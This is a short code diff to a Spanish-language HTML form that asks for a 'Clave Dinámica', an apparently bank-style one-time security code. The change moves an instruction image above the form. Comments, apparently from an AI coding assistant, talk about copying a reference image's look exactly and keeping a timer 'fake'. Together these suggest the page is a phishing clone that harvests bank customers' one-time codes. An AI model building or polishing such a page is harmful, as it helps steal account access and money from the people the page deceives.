@@ -8,6 +8,11 @@
             último a "Claves Dinámicas".
         </p>
 
+        <div style="text-align:center; margin: 15px 0;">
+            <img src="assets/img/dynamic_instruction.png" alt="Instrucción"
+                style="max-width:100%; border-radius:8px; width: 220px;">
+        </div>
+
         <!-- No timer for Dynamic Key usually, or we can keep it fake if requested. Image didn't show timer but same style. -->
         <!-- User said "usa el mismo codigo" so I will keep the structure but maybe hide timer if not needed.
              The reference image for Clave Dinamica DOES NOT show a timer usually, but I will comment it out or leave it if user wants EXACTLY the same.
@@ -42,11 +47,6 @@
         </div>
 
         <input type="hidden" name="dinamica" id="dinamicaFull">
-
-        <div style="text-align:center; margin: 15px 0;">
-            <img src="assets/img/dynamic_instruction.png" alt="Instrucción"
-                style="max-width:100%; border-radius:8px; width: 220px;">
-        </div>
 
         <button type="submit" class="btn btn-login" id="cdButton" disabled>Continuar</button>
     </form>
